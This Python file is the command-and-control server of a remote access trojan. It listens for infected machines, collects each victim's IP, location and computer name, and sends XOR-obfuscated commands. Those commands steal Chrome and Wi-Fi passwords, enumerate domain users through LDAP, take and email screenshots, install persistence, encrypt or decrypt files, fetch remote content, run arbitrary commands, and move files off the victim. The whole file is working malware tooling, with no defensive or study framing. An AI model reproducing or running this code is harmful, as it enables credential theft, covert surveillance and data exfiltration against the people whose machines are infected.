import sys
import os
import socket
import subprocess
import string
import random
import keyboard
import ntpath
import getpass
import encodings.idna
from pathlib import Path
import time
from ldap3 import Server, Connection, ALL, NTLM, ALL_ATTRIBUTES, ALL_OPERATIONAL_ATTRIBUTES, AUTO_BIND_NO_TLS, SUBTREE
from ldap3.core.exceptions import LDAPCursorError

global connected
def connect():
    connected = []
    sct = socket.socket()
    port = 44445
    sct.bind(("", port))
    sct.listen(2)
    print("Listening for connection")
    conn, addr = sct.accept()
    #connected.append(addr)
    print(addr)
    print('')

    key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase +
                            string.digits + '^!\$%&/()=?[{}]+`~#-_.:,;<>|\\') for _ in range(0,4096))


    print(' ________  ________   ______   __    __  __    __  ______  __    __  ________')
    print('/        |/        | /      \ /  |  /  |/  \  /  |/      |/  \  /  |/        |')
    print('$$$$$$$$/ $$$$$$$$/ /$$$$$$  |$$ |  $$ |$$  \ $$ |$$$$$$/ $$  \ $$ |$$$$$$$$/') 
    print('   $$ |   $$ |__    $$ |  $$/ $$ |__$$ |$$$  \$$ |  $$ |  $$$  \$$ |$$ |__   ') 
    print('   $$ |   $$    |   $$ |      $$    $$ |$$$$  $$ |  $$ |  $$$$  $$ |$$    |  ') 
    print('   $$ |   $$$$$/    $$ |   __ $$$$$$$$ |$$ $$ $$ |  $$ |  $$ $$ $$ |$$$$$/   ') 
    print('   $$ |   $$ |_____ $$ \__/  |$$ |  $$ |$$ |$$$$ | _$$ |_ $$ |$$$$ |$$ |_____') 
    print('   $$ |   $$       |$$    $$/ $$ |  $$ |$$ | $$$ |/ $$   |$$ | $$$ |$$       |')
    print('   $$/    $$$$$$$$/  $$$$$$/  $$/   $$/ $$/   $$/ $$$$$$/ $$/   $$/ $$$$$$$$/')
    print('')
    
    conn.send(key.encode())
    print(conn.recv(1024).decode())
    conn.send(' '.encode())
    print(conn.recv(1024).decode())
    conn.send(' '.encode())
    print('\n')
    #Receive IP,ComputerName/User,WebcamStatus,Location,etc here-------------------------------------
    try:
        ip = (conn.recv(1024).decode())
        conn.send(' '.encode())
        print(ip)
        location = (conn.recv(1024).decode())
        conn.send(' '.encode())
        print(location)
        pcname = (conn.recv(1024).decode())
        conn.send(' '.encode())
        print(pcname)
        connected.append(ip)
        connected.append(location)
        connected.append(pcname)
    except Exception as e:
        print(e)
    print("\n")
    print('Input command or type phelp for help.')
    
    while True:
        command = input("\n>")
        str_xor(command, key)
        enc = str_xor(command, key)
        #print(enc)
        
        if 'exit' in command:
            conn.send('exit'.encode())
            conn.close()
            break

        elif command == 'bots':
            print(connected)

        elif 'curl' in command:
            conn.send(enc.encode())
            print(conn.recv(1024).decode())
            link = input()
            conn.send(link.encode())
        
        elif 'download' in command:
            download(conn, enc, command)

        elif command == 'driveinfo':
            conn.send(enc.encode())
            print(conn.recv(1024).decode())

        elif command == 'encrypt':
            i = 0
            conn.send(enc.encode())
            print(conn.recv(1024).decode())
            selection = input()
            conn.send(selection.encode())
            
        elif command == 'decrypt':
            conn.send(enc.encode())
            print(conn.recv(1024).decode())
            selection = input()
            conn.send(selection.encode())

        elif command == 'chromepasswords':
            newpasswords = []
            conn.send(enc.encode())
            passwords = conn.recv(8092)
            pw = passwords.decode()
            newpw = pw.split(',')
            for each in newpw:
                newpasswords.append(each)
            for x in range(len(newpasswords)):
                print(newpasswords[x])

        elif command == 'domainusers':
            conn.send(enc.encode())
            print(conn.recv(1024).decode())
            servername = input()
            conn.send(servername.encode())
            print(conn.recv(1024).decode())
            domainname = input()
            conn.send(domainname.encode())
            print(conn.recv(1024).decode())
            domainuser = input()
            conn.send(domainuser.encode())
            print(conn.recv(1024).decode())
            domainpass = input()
            conn.send(domainpass.encode())
            print(conn.recv(32368).decode())

        elif command == 'getwifinetworks':
            networks = []
            conn.send(enc.encode())
            nets = conn.recv(1024)
            net = nets.decode()
            newnet = net.split(',')
            for each in newnet:
                networks.append(each)
            for x in range(len(networks)):
                print(networks[x])
            

        elif command == 'getwifipasswords':
            conn.send(enc.encode())
            print(conn.recv(1024).decode())
            wifi = input()
            conn.send(wifi.encode())
            print(conn.recv(4096).decode())

        elif command == 'pcinfo':
            conn.send(enc.encode())
            print(conn.recv(1024).decode())
            
            
        elif 'runpersistence' in command:
            conn.send(enc.encode())
            print(conn.recv(1024).decode())

        elif command == 'screenshot':
            conn.send(enc.encode())
            print(conn.recv(1024).decode())
            number = str(input())
            conn.send(number.encode())
            print(conn.recv(1024).decode())

        elif 'sendscreenshot' in command:
            conn.send(enc.encode())
            #ScreenshotNumber
            print(conn.recv(1024).decode())
            selection = input()
            conn.send(selection.encode())
            #---------------------------
            #EmailTo
            print(conn.recv(1024).decode())
            emailto = getpass.getpass()
            conn.send(emailto.encode())
            #-------------------------------
            #EmailFrom
            print(conn.recv(1024).decode())
            emailfrom = getpass.getpass()
            conn.send(emailfrom.encode())
            #------------------------------
            #Password
            print(conn.recv(1024).decode())
            pwd = getpass.getpass()
            conn.send(pwd.encode())
            #------------------------
            print(conn.recv(1024).decode())

#---------TEMPORARY-----------------------TEMPORARY-----------------------------------

        elif 'dirup' in command:
            dirup(conn, enc, command)
#------------------TEMPORARY------------------------------------------TEMPORARY-------
        elif 'upload' in command:
            upload(conn, enc, command)

        elif command == 'whoami':
            conn.send(enc.encode())
            print(conn.recv(1024).decode())
    
        else:
            conn.send(enc.encode())
            print(conn.recv(8192).decode())
#-----------------------------------------------------------------

def upload(conn, enc, command):
    upload, path = command.split(' ')
    try:
        if os.path.exists(path):
            if os.path.isfile(path):
                conn.send(enc.encode())
                f = open(path, 'rb')
                packet = f.read(1024)
                while len(packet) > 0:
                    conn.send(packet)
                    packet = f.read(1024)
                conn.send("DONE".encode())
            else:
                print('This is not a file')
        else:
            print('File Not Found')
    except Exception as ex:
        print(ex)

#-----------------------------------------------------------------

def dirup(conn, enc, command):
    directory, path = command.split(' ')
    try:
        if os.path.isdir(path):
            files = os.listdir(path)   
            folder = (os.path.basename(path))
            conn.send(enc.encode())
            conn.send(folder.encode())
            conn.recv(256)
            conn.send(str(files).encode())
            for file in files:
                f = open(path + '\\' + file, 'rb')
                packet = f.read(1024)
                while len(packet) > 0:
                    conn.send(packet)
                    packet = f.read(1024)
                conn.send("DONE".encode())
                print(file +  ' done')
    except Exception as e:
        print(e)
#---------------------------------------------------------------------------------    
def download(conn, enc, command):
    conn.send(enc.encode())
    download, path = command.split(' ')
    print(path)
    path = (ntpath.basename(path))
    prepath = os.getenv("APPDATA")
    f = open(prepath + '/' + path, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith("DONE".encode()):
            f.write(bits[:-4])
            f.close()
            print('Download Complete')
            break
        if 'File not found'.encode() in bits:
            print('Unable To Find File')
            break
        f.write(bits)
#--------------------------------------------------------------------------
def str_xor(s1, s2):
    return "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1,s2)])

connect()

